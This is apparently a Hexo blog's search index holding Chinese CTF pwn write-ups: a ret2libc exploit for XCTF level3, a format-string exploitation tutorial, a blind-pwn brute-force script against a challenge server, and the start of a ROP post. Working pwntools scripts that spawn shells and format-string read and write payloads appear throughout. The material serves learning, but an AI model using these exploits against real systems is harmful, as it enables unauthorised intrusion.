<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>mass</title>
      <link href="/2020/05/23/mass/"/>
      <url>/2020/05/23/mass/</url>
      
        <content type="html"><![CDATA[<pre><code>             hexo基本写文章操作：</code></pre><p>1：在自己本地blog文件夹git bash here<br><img src="https://s1.ax1x.com/2020/05/23/YjltX9.png" alt=""></p><p>2:在bash中：hexo n “name” 或是直接在_posts中写文章</p><p>3：文章中插入图片<br>    语法：</p><p>![图片alt](图片地址 ‘’图片title’’)</p><p>图片alt就是显示在图片下面的文字，相当于对图片内容的解释。<br>图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加</p><p>4：图床：<a href="https://imgchr.com/matri_x" target="_blank" rel="noopener">https://imgchr.com/matri_x</a></p><p>5：hexo g //生成静态网页，用于测试<br>    hexo s  //打开本地服务器，结合用于测试<br>    hexo d  //上传到github发布</p>]]></content>
      
      
      
        <tags>
            
            <tag> mass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析got，plt，libc</title>
      <link href="/2020/05/23/qian-xi-got-plt-libc/"/>
      <url>/2020/05/23/qian-xi-got-plt-libc/</url>
      
        <content type="html"><![CDATA[<p>见详解：<a href="https://blog.csdn.net/weixin_41185953/article/details/104224260" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/104224260</a></p><p>在引用一个函数时（如call printf）先会条到该函数的plt表：@plt。然后plt表上存有对应该函数的got表地址，跳到got表上。这个表上面存放被引用函数的真实地址。<br>为了程序运行时的效率，还没有引用某个函数时程序不会连接启用包括此函数这样就使程序运行速度更快。</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj19c4.png" alt="picture1"></p><p>libc文件里面包含大量函数包括system，read，write还有字符串/bin/sh ，libc在被程序引用时会分配到一个地址也就是libc的首地址，然后里面的函数或被程序引用。</p><p>引用过程：<br>首先libc分配到一个地址，他里面的函数字符串什么的本来就有内部基于libc首地址的偏移量，这些偏移量都是可以用ELF指令解析libc文件再用搜寻指令查到。所以一旦libc被引用分配得首地址libc里面所包括的所有函数和字符串地址就都确定了。call函数时用上述的plt，got表跳转寻址，最后通过重定位got表得到真实函数地址。</p><p>对应题目：xctf pwn level3<br>1:file</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1m9O.png" alt="picture2"></p><p>2:checksec</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1VN6.png" alt="picture3"></p><p>可以栈溢出，NX开启：rop绕过</p><p>3：ida</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1kH1.png" alt="picture4"></p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1EAx.png" alt="picture5"></p><p>查看buf的栈空间发现可以溢出：溢出量140</p><p>所以现在的思路就是：payload = “A”*140 + p32(system_addr) + p32(0) + p32(binsh_addr)<br>所以得有哦system函数和binsh字符串   注意此处system函数的构建：函数地址+返回地址+函数参数  很多情况都是在栈中这样构建函数</p><p>4：ida查看函数与字符串</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1FBR.png" alt="picture6"></p><p>显然这个程序只调用了read和write函数，没有system和binsh。恰好libc里面这两个都有所以要想办法得到libc的基地址。</p><p>这里write函数有三个参数：1，字符串（地址），显示的字节数</p><p>如果我们溢出了read函数后跳到我们自己构建的write函数上，把中间的参数改为write的got地址那么显示出got表上存放write函数的真实<br>地址（plt存储got表地址，got表存放函数地址）。<br>如果我们得到了write函数的真实地址，然后可以轻松得到write函数在libc中的偏移量，最后算出libc的基地址：libc_addr = write_addr - write_offset<br>得到了libc的基地址那么我们就可以得到system和binsh的真实地址，然后再进行一次溢出攻击即可</p><p>exp：<br>from pwn import*</p><p>sh = remote(“124.126.19.106”,52825)</p><p>#sh = process(“level3”)</p><p>elf = ELF(“level3”)<br>libc = ELF(“libc_32.so.6”)</p><p>write_plt = elf.symbols[‘write’]    #write函数的plt地址<br>write_got = elf.got[‘write’]  #write函数的got地址，该地址存放write真实地址<br>main_addr = 0x08048484 #main函数地址可以从ida直接看，也可以elf.symbols[‘main’]搜索</p><p>#print write_plt<br>#print write_got<br>#print main_addr</p><p>payload = “A”*140 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4) #第一次攻击溢出后返回到write函数的plt地址，因为write函数早已调用可以用plt地址或got地址来再次调用。后面时返回地址，返回到主函数将再次执行vulnerable函数以备下一次攻击。p32（1）为write函数的第一个参数，接下来分别是第二个第三个参数。p32（write_got）将go地址发给write作为参数，write将读取该地址上的内容并以字符串输出，p32(4)输出4字节</p><p>#p.recv()<br>sh.recv() </p><p>sh.sendline(payload)</p><p>write_addr = u32(sh.recv(4))  #sh.recv(4)是接受4个字节的输出，u32和p32功能相反</p><p>#print write_addr</p><p>libc_addr = write_addr - libc.symbols[‘write’] #减去了write的offset</p><p>#print(hex(libc_addr))</p><p>#print “libc”+hex(libc_addr)</p><p>binsh_addr = libc_addr + libc.search(“/bin/sh”).next()  #得到binsh真实地址</p><p>#print “binsh_addr =&gt; “+hex(binsh_addr)</p><p>sys_addr = libc_addr + libc.symbols[‘system’]  #得到system真实地址</p><p>print “sys_addr =&gt; “+hex(sys_addr)</p><p>payload = “A”*140 + p32(sys_addr) + p32(0) + p32(binsh_addr)  #通过上次攻击返回地址位vulnerable函数可以再次攻击</p><p>sh.recv()</p><p>sh.sendline(payload)</p><p>sh.interactive()</p><p>注意在本地测试脚本时要找到本地level3引用的libc文件：指令ldd level3</p><p><img src="https://s1.ax1x.com/2020/05/23/Yj1Z4K.png" alt="picture7"></p><p>因为本地的libc文件和题目给的有点不一样，至少offset是不一样的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Format String Exploit</title>
      <link href="/2020/05/22/formal/"/>
      <url>/2020/05/22/formal/</url>
      
        <content type="html"><![CDATA[<pre><code>                   格式化字符串漏洞原理</code></pre><p>格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。比如说’%s’表明我们会输出一个字符串参数。</p><p><img src="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/figure/printf.png" alt="函数"></p><p>对于这样的例子，在进入 printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下<br>some value   //未知量<br> 3.14 123456<br> addr of “red”<br> addr of format string: Color %s…</p><p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况<br>当前字符不是 %，直接输出到相应标准输出。<br>当前字符是 %， 继续读取下一个字符<br>如果没有字符，报错<br>如果下一个字符是 %, 输出 %<br>否则根据相应的字符，获取相应的参数，对其进行解析并输出</p><p>假设编写如下程序:<br>printf(“Color %s, Number %d, Float %4.2f”);<br>程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为<br>1.解析其地址对应的字符串<br>2.解析其内容对应的整形值<br>3.解析其内容对应的浮点值</p><p>#以上来源于<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr</a></p><p>漏洞利用</p><p>1：程序崩溃<br>因为栈上会有很多权限不足的地址无法进行访问，利用无法访问地址使程序崩溃<br>一般输入多个%s即可<br>2：泄露内存<br>获取某个变量的值，或是某个变量对应的地址<br>例：<br>程序如下：<br>#include &lt;stdio.h&gt;<br>int main() {<br>  char s[100];<br>  int a = 1, b = 0x22222222, c = -1;<br>  scanf(“%s”, s);<br>  printf(“%08x.%08x.%08x.%s\n”, a, b, c, s);<br>  printf(s);<br>  return 0;<br>}<br>简单编译并将防护关闭：gcc -m32 -fno-stack-protector -no-pie -o test test.c<br>（32位，关闭栈溢出防护，PIE）<br>根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取)。这里我们主要介绍 32 位。</p><p>获取栈变量数值：<br>%08x.%08x.%08x<br>00000001.22222222.ffffffff.%08x.%08x.%08x<br>ff9645f0.f7ee9410.0804849d</p><p>以上可以看出我们确实得到了3个16进制的数据。我们用gdb继续深入</p><p>首先再printf下断点：<br>gdb-peda$ b printf<br>Breakpoint 1 at 0x8048330<br>继续运行：<br>gdb-peda$ r<br>Starting program: /home/hunter/PWN/formal/wiki/test1<br>%08x.%08x.%08x  //我们还是输入%08x.%08x.%08x</p><p>回车继续运行，程序停在第一次调用printf处：<br>=&gt; 0xf7e2db60 <printf>:<br>    call   0xf7f11c79<br>   0xf7e2db65 &lt;printf+5&gt;:<br>    add    eax,0x18449b<br>   0xf7e2db6a &lt;printf+10&gt;:<br>    sub    esp,0xc<br>   0xf7e2db6d &lt;printf+13&gt;:<br>    mov    eax,DWORD PTR [eax-0x7c]<br>   0xf7e2db73 &lt;printf+19&gt;:<br>    lea    edx,[esp+0x14]<br>No argument<br>[————————————stack————————————-]<br>0000| 0xffffcfac –&gt; 0x80484ea (&lt;main+100&gt;:    )   //printf函数的返回地址<br>0004| 0xffffcfb0 –&gt; 0x8048593 (“%08x.%08x.%08x.%s\n”) printf函数第一个参数即格式化字符串<br>0008| 0xffffcfb4 –&gt; 0x1   //变量a的地址 （格式化字符串的第一个参数）<br>0012| 0xffffcfb8 (“&quot;&quot;&quot;&quot;\377\377\377\377\320\317\377\377\320\317\377\377\020\364\374\367\235\204\004\b%08x.%08x.%08x”)    //变量b，我不知道为啥是这么一大串，理论上是0x22222222<br>0016| 0xffffcfbc –&gt; 0xffffffff  //变量c<br>0020| 0xffffcfc0 –&gt; 0xffffcfd0 (“%08x.%08x.%08x”)  该变量是我们输入的格式化字符串对应的地址<br>0024| 0xffffcfc4 –&gt; 0xffffcfd0 (“%08x.%08x.%08x”)<br>0028| 0xffffcfc8 –&gt; 0xf7fcf410 –&gt; 0x8048278 (“GLIBC_2.0”)<br>[——————————————————————————]<br>Legend: code, data, rodata, value</p><p>Breakpoint 1, 0xf7e2db60 in printf<br>    () from /lib32/libc.so.6<br>gdb-peda$ </p><p>继续执行：<br>gdb-peda$ c<br>Continuing.<br>00000001.22222222.ffffffff.%08x.%08x.%08x<br>程序确实输出了每一个变量对应的数值，并停在第二个printf<br>=&gt; 0xf7e2db60 <printf>:    call   0xf7f11c79<br>   0xf7e2db65 &lt;printf+5&gt;:<br>    add    eax,0x18449b<br>   0xf7e2db6a &lt;printf+10&gt;:    sub    esp,0xc<br>   0xf7e2db6d &lt;printf+13&gt;:<br>    mov    eax,DWORD PTR [eax-0x7c]<br>   0xf7e2db73 &lt;printf+19&gt;:<br>    lea    edx,[esp+0x14]<br>No argument<br>[————————————stack————————————-]<br>0000| 0xffffcfbc –&gt; 0x80484f9 (&lt;main+115&gt;:    add    esp,0x10)<br>0004| 0xffffcfc0 –&gt; 0xffffcfd0 (“%08x.%08x.%08x”)<br>0008| 0xffffcfc4 –&gt; 0xffffcfd0 (“%08x.%08x.%08x”)<br>0012| 0xffffcfc8 –&gt; 0xf7fcf410 –&gt; 0x8048278 (“GLIBC_2.0”)<br>0016| 0xffffcfcc –&gt; 0x804849d (&lt;main+23&gt;:    add    ebx,0x1b63)<br>0020| 0xffffcfd0 (“%08x.%08x.%08x”)<br>0024| 0xffffcfd4 (“.%08x.%08x”)<br>0028| 0xffffcfd8 (“x.%08x”)<br>[——————————————————————————]<br>Legend: code, data, rodata, value</p><p>Breakpoint 1, 0xf7e2db60 in printf ()<br>   from /lib32/libc.so.6<br>gdb-peda$ </p><p>此时，由于格式化字符串为 %x%x%x，所以，程序 会将栈上的 0xffffcd04 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出：<br>gdb-peda$ c<br>Continuing.<br>ffffcfd0.f7fcf410.0804849d[Inferior 1 (process 9574) exited normally]</p><p>想获取栈变量数值，我们一般用%p代替%08x。</p><p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p><p>可以用%n$x来对应栈中第n+1个参数，因为对于printf函数格式化字符串就是栈中第一个参数，而格式化字符串后面的数据就是该格式化字符串内将被替换的参数</p><p>gdb再次深入：<br>Starting program: /home/hunter/PWN/formal/wiki/test1<br>%3$x</p><p>[———————————-registers———————————–]<br>EAX: 0x8048593 (“%08x.%08x.%08x.%s\n”)<br>EBX: 0x804a000 –&gt; 0x8049f14 –&gt; 0x1<br>ECX: 0x1<br>EDX: 0xf7fb389c –&gt; 0x0<br>ESI: 0xf7fb2000 –&gt; 0x1d4d6c<br>EDI: 0x0<br>EBP: 0xffffd048 –&gt; 0x0<br>ESP: 0xffffcfac –&gt; 0x80484ea (&lt;main+100&gt;:    add    esp,0x20)<br>EIP: 0xf7e2db60 (<printf>:    call   0xf7f11c79)<br>EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)<br>[————————————-code————————————-]<br>   0xf7e2db5b &lt;fprintf+27&gt;:    ret<br>   0xf7e2db5c:    xchg   ax,ax<br>   0xf7e2db5e:    xchg   ax,ax<br>=&gt; 0xf7e2db60 <printf>:    call   0xf7f11c79<br>   0xf7e2db65 &lt;printf+5&gt;:<br>    add    eax,0x18449b<br>   0xf7e2db6a &lt;printf+10&gt;:    sub    esp,0xc<br>   0xf7e2db6d &lt;printf+13&gt;:<br>    mov    eax,DWORD PTR [eax-0x7c]<br>   0xf7e2db73 &lt;printf+19&gt;:<br>    lea    edx,[esp+0x14]<br>No argument<br>[————————————stack————————————-]<br>0000| 0xffffcfac –&gt; 0x80484ea (&lt;main+100&gt;:    add    esp,0x20)<br>0004| 0xffffcfb0 –&gt; 0x8048593 (“%08x.%08x.%08x.%s\n”) //函数参数1<br>0008| 0xffffcfb4 –&gt; 0x1    //函数参数2<br>0012| 0xffffcfb8 (“&quot;&quot;&quot;&quot;\377\377\377\377\320\317\377\377\320\317\377\377\020\364\374\367\235\204\004\b%3$x”)    //函数参数3<br>0016| 0xffffcfbc –&gt; 0xffffffff  //函数参数4.。。。。<br>0020| 0xffffcfc0 –&gt; 0xffffcfd0 (“%3$x”)<br>0024| 0xffffcfc4 –&gt; 0xffffcfd0 (“%3$x”)<br>0028| 0xffffcfc8 –&gt; 0xf7fcf410 –&gt; 0x8048278 (“GLIBC_2.0”)<br>[——————————————————————————]<br>Legend: code, data, rodata, value</p><p>Breakpoint 1, 0xf7e2db60 in printf ()<br>   from /lib32/libc.so.6<br>gdb-peda$ </p><p>继续：<br>0xf7e2db60 <printf>:    call   0xf7f11c79<br>   0xf7e2db65 &lt;printf+5&gt;:<br>    add    eax,0x18449b<br>   0xf7e2db6a &lt;printf+10&gt;:    sub    esp,0xc<br>   0xf7e2db6d &lt;printf+13&gt;:<br>    mov    eax,DWORD PTR [eax-0x7c]<br>   0xf7e2db73 &lt;printf+19&gt;:<br>    lea    edx,[esp+0x14]<br>No argument<br>[————————————stack————————————-]<br>0000| 0xffffcfbc –&gt; 0x80484f9 (&lt;main+115&gt;:    add    esp,0x10) //第二次调用，返回地址<br>0004| 0xffffcfc0 –&gt; 0xffffcfd0 (“%3$x”)  //函参1<br>0008| 0xffffcfc4 –&gt; 0xffffcfd0 (“%3$x”)  // 2   （格式化参数1。。。）<br>0012| 0xffffcfc8 –&gt; 0xf7fcf410 –&gt; 0x8048278 (“GLIBC_2.0”)    //3<br>0016| 0xffffcfcc –&gt; 0x804849d (&lt;main+23&gt;:    add    ebx,0x1b63)   //4<br>0020| 0xffffcfd0 (“%3$x”)<br>0024| 0xffffcfd4 –&gt; 0x0<br>0028| 0xffffcfd8 –&gt; 0xf7ffd940 –&gt; 0x0<br>[——————————————————————————]<br>Legend: code, data, rodata, value</p><p>Breakpoint 1, 0xf7e2db60 in printf ()<br>   from /lib32/libc.so.6<br>gdb-peda$ </p><p>以此判断程序将输出0x804849d：</p><p>gdb-peda$ c<br>Continuing.<br>804849d[Inferior 1 (process 9897) exited normally]</p><p>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</p><p>小结：</p><pre><code>    利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。    利用 %s 来获取变量所对应地址的内容，只不过有零截断。    利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</code></pre><p>3：泄露任意地址内存<br>有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了</p><p>一般来说我们所读取的变量值都是在栈上的，因为是某个函数的局部变量。</p><p>由于我们可以控制格式化字符串，如果我们知道输出函数调用时我们的格式化字符串是第几个参数就可以构造特定形式来获取某些addr，如：p32（addr）%K$s<br>我们可以用下面的方法确定参数偏移：<br>[tag]%p%p%p%p%p%p…</p><p>如：<br>AAAA%p%p%p%p%p%p%p%p<br>00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p<br>AAAA0xff99da800xf7f814100x804849d0x414141410x702570250x702570250x702570250x70257025<br>所以得到参数位置是5，是格式化字符串的第4个参数</p><p>现在我们可以来访问某些函数的地址如scanf函数，首先找到其got地址<br>利用pwntools得：<br>from pwn import*</p><p>sh = process(“test1”)</p><p>elf = ELF(“test1”)</p><p>scanf_got = elf.got[‘__isoc99_scanf’]<br>print hex(scanf_got)</p><p>payload = p32(scanf_got) + ‘%4$s’<br>print payload</p><p>gdb.attach(sh)   //进一步调试</p><p>sh.sendline(payload)<br>sh.recvuntil(“%4$s\n”)</p><p>print hex(u32(sh.recv()[4:8]))</p><p>sh.interactive()</p><p>在脚本启动gdb后先finih直到main函数然后在printf下断点。<br>=&gt; 0xf7e25b60 <printf>:    call   0xf7f09c79<br>   0xf7e25b65 &lt;printf+5&gt;:<br>    add    eax,0x18449b<br>   0xf7e25b6a &lt;printf+10&gt;:    sub    esp,0xc<br>   0xf7e25b6d &lt;printf+13&gt;:<br>    mov    eax,DWORD PTR [eax-0x7c]<br>   0xf7e25b73 &lt;printf+19&gt;:<br>    lea    edx,[esp+0x14]<br>No argument<br>[————————————stack————————————-]<br>0000| 0xffefdd2c –&gt; 0x80484ea (&lt;main+100&gt;:    add    esp,0x20)<br>0004| 0xffefdd30 –&gt; 0x8048593 (“%08x.%08x.%08x.%s\n”)<br>0008| 0xffefdd34 –&gt; 0x1<br>0012| 0xffefdd38 (“&quot;&quot;&quot;&quot;\377\377\377\377P\335\357\377P\335\357\377\020t\374\367\235\204\004\b\024\240\004\b%4$s”)<br>0016| 0xffefdd3c –&gt; 0xffffffff<br>0020| 0xffefdd40 –&gt; 0xffefdd50 –&gt; 0x804a014 –&gt; 0xf7e38410 (&lt;<strong>isoc99_scanf&gt;:    push   ebp)<br>0024| 0xffefdd44 –&gt; 0xffefdd50 –&gt; 0x804a014 –&gt; 0xf7e38410 (&lt;</strong>isoc99_scanf&gt;:    push   ebp)<br>0028| 0xffefdd48 –&gt; 0xf7fc7410 –&gt; 0x8048278 (“GLIBC_2.0”)<br>[——————————————————————————]<br>Legend: code, data, rodata, value</p><p>Breakpoint 1, 0xf7e25b60 in printf ()<br>   from /lib32/libc.so.6<br>gdb-peda$ </p><p>可以看到第4个参数确实是scanf的在libc库中的地址</p><p>在调试结束后的terminal可以得到scanf的地址：<br>0x804a014<br>\x14\x04%4$s<br>[<em>] running in new terminal: /usr/bin/gdb -q  “./test1” 11351 -x “/tmp/pwn7ki8h7.gdb”<br>[+] Waiting for debugger: Done<br>0xf7d5e410<br>[</em>] Switching to interactive mode<br>[<em>] Process ‘./test1’ stopped with exit code 0 (pid 11351)<br>[</em>] Got EOF while reading in interactive<br>$  </p><p>有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字(32位4，64位8）长整数倍的地址处，一般来说，类似于下面的这个样子。<br>[padding][addr]</p><p>4：内存覆盖<br>只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值：%n,<br>%n不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</p><p>程序：<br>#include &lt;stdio.h&gt;<br>int a = 123, b = 456;<br>int main() {<br>  int c = 789;<br>  char s[100];<br>  printf(“%p\n”, &amp;c);<br>  scanf(“%s”, s);<br>  printf(s);<br>  if (c == 16) {<br>    puts(“modified c.”);<br>  } else if (a == 2) {<br>    puts(“modified a for a small number.”);<br>  } else if (b == 0x12345678) {<br>    puts(“modified b for a big number!”);<br>  }<br>  return 0;<br>}</p><p>基本构造格式如下：<br>…[overwrite addr]….%[overwrite offset]$n<br>其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数<br>步骤：<br>    确定覆盖地址<br>    确定相对偏移<br>    进行覆盖</p><p>确定覆盖地址：首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。</p><p>确定相对偏移：其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()<br>hunter@hunter:~/PWN/formal/wiki$ ./test2<br>0xffebe8ac<br>AAAA%p%p%p%p%p%p%p%p%p<br>AAAA0xffebe8480xf7ef14100x80484bd(nil)0x10x414141410x702570250x702570250x70257025<br>所以是第7 个参数  =》  n为6</p><p>进行覆盖：<br>将c的地址放在n=6，然后利用%n来修改c的值<br>[addr of c]%012d%6$n    //addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。</p><p>Exp：<br>sh = process(‘test2’)<br>    c_addr = int(sh.recvuntil(‘\n’, drop=True), 16)  //drop ：是否保留<br>    print hex(c_addr)<br>    payload = p32(c_addr) + ‘%012d’ + ‘%6$n’<br>    print payload<br>    #gdb.attach(sh)<br>    sh.sendline(payload)<br>    print sh.recv()<br>    sh.interactive()</p><p>覆盖小数字：<br>下面的问题是将a改为2  因为a是全局变量，在data段地址可从ida获取<br>这里以 2 为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。  （或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。）</p><p>我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是：aa%k$naa  刚好占8字节所以我们的地址被挤到第n=8个参数</p><p>利用 ida 可以得到 a 的地址为 0x0804A024（由于 a、b 是已初始化的全局变量，因此不在堆栈中）。</p><p>.data:0804A024                 public a<br>.data:0804A024 a               dd 7Bh</p><p>故而我们可以构造如下的利用代码</p><pre><code>sh = process(&#39;test2&#39;)a_addr = 0x0804A024payload = &#39;aa%8$naa&#39; + p32(a_addr)sh.sendline(payload)print sh.recv()sh.interactive()</code></pre><p>其实，这里我们需要掌握的小技巧就是，我们没有必要必须把地址放在最前面，放在那里都可以，只要我们可以找到其对应的偏移即可。</p><p>覆盖大数字<br>我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12</p><p>首先，我们还是要确定的是要覆盖的地址为多少，利用 ida 看一下，可以发现地址为 0x0804A028。</p><p>.data:0804A028                 public b<br>.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r</p><p>即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p><p>0x0804A028 \x78<br>0x0804A029 \x56<br>0x0804A02a \x34<br>0x0804A02b \x12</p><p>这里将构造一个推算代码：（本人不懂）<br>def fmt(prev, word, index):<br>    if prev &lt; word:<br>        result = word - prev<br>        fmtstr = “%” + str(result) + “c”<br>    elif prev == word:<br>        result = 0<br>    else:<br>        result = 256 + word - prev<br>        fmtstr = “%” + str(result) + “c”<br>    fmtstr += “%” + str(index) + “$hhn”<br>    return fmtstr</p><p>def fmt_str(offset, size, addr, target):<br>    payload = “”<br>    for i in range(4):<br>        if size == 4:<br>            payload += p32(addr + i)<br>        else:<br>            payload += p64(addr + i)<br>    prev = len(payload)<br>    for i in range(4):<br>        payload += fmt(prev, (target &gt;&gt; i * 8) &amp; 0xff, offset + i)<br>        prev = (target &gt;&gt; i * 8) &amp; 0xff<br>    return payload<br>payload = fmt_str(6,4,0x0804A028,0x12345678)</p><pre><code>offset 表示要覆盖的地址最初的偏移size 表示机器字长addr 表示将要覆盖的地址。target 表示我们要覆盖为的目的变量值。</code></pre><p>这其实就是pwntools的一个模块：当要写入很大的数时可以用pwntools的fmtstr模块：我们希望向0x08048000写入值0x10203040，在pwntools里，我们可以用命令fmtstr_payload。<br>payload = fmtstr_payload(6,{0x08048000:0x10203040}) // 即可 ， 6是偏移量。</p><p>详情:<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf进阶-pwn-warmup</title>
      <link href="/2020/05/16/xctf-jin-jie-pwn-warmup/"/>
      <url>/2020/05/16/xctf-jin-jie-pwn-warmup/</url>
      
        <content type="html"><![CDATA[<p>这个提没有附件，被称为盲打，blind pwn<br><img src="https://s1.ax1x.com/2020/05/23/YjvFy9.png" alt=""></p><p>黑箱测试之类的。</p><p>linux连接尝试：<br><img src="https://s1.ax1x.com/2020/05/23/YjviQJ.png" alt=""></p><p>因为没有关键提示，可以从溢出方面下手，这个地址很可能就是后门。</p><p>exp爆破：</p><pre><code>from pwn import *#context.log_level = &#39;debug&#39;addr = 0x40060d    #地址可能是p32 也可能是p64def fuzz(r, num, flag):    #爆破函数 , flag表示有3种可能：p32发送后门，p64发送后门，无效后门。    payload = &#39;a&#39; * num    if flag==1:        payload += p32(addr)    if flag==2:        payload += p64(addr)    r.recvuntil(&quot;&gt;&quot;)    r.sendline(payload)def main():    for i in range(1000):          print(i)        for j in range(3):            try:                r = remote(&quot;101.200.240.241&quot;, 7000)                fuzz(r, i, j)                text = r.recv()                print(&#39;text.len=&#39;+str(len(text))+&#39;text=&#39;+text)                print(&#39;num=&#39;+str(i)+&#39; flag=&#39;+str(j))                r.interactive()            except:            #except为空则try语句中出现任何错误都会执行r.close()                r.close()if __name__ == &#39;__main__&#39;:    main()</code></pre><p>对于循环脚本可用ctr + c 打断无法继续下去的一个循环进行下一个循环</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP_x86</title>
      <link href="/2020/04/23/rop-x86/"/>
      <url>/2020/04/23/rop-x86/</url>
      
        <content type="html"><![CDATA[<h2 id="ROP的全称为Return-oriented-programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。"><a href="#ROP的全称为Return-oriented-programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。" class="headerlink" title="ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。"></a>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</h2><h3 id="Control-Flow-Hijack-程序流劫持"><a href="#Control-Flow-Hijack-程序流劫持" class="headerlink" title="Control Flow Hijack 程序流劫持"></a>Control Flow Hijack 程序流劫持</h3><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。</p><p>level1：无防护32位<br>ida伪代码：<br><img src="https://s1.ax1x.com/2020/05/23/YvFWpq.png" alt=""></p><p>进入vulnerable（危险）函数：<br><img src="https://s1.ax1x.com/2020/05/23/YvFWpq.png" alt=""></p><p>从char buf （后面的注释）这一段可知其大小大概为0x88+0x10.<br>下面的read函数256u表示允许读入256个字符，显然存在溢出。<br>进入buf：<br><img src="https://s1.ax1x.com/2020/05/23/YvkNbF.png" alt=""><br>所以（下面的没截下来）buf可放入0x88+0x8个字符（140），还可以通过调试进一步验证。</p><h3 id="那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。"><a href="#那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。" class="headerlink" title="那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。"></a>那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。</h3><h2 id="调试："><a href="#调试：" class="headerlink" title="调试："></a>调试：</h2><p>在read函数时制造200个字符：<br><img 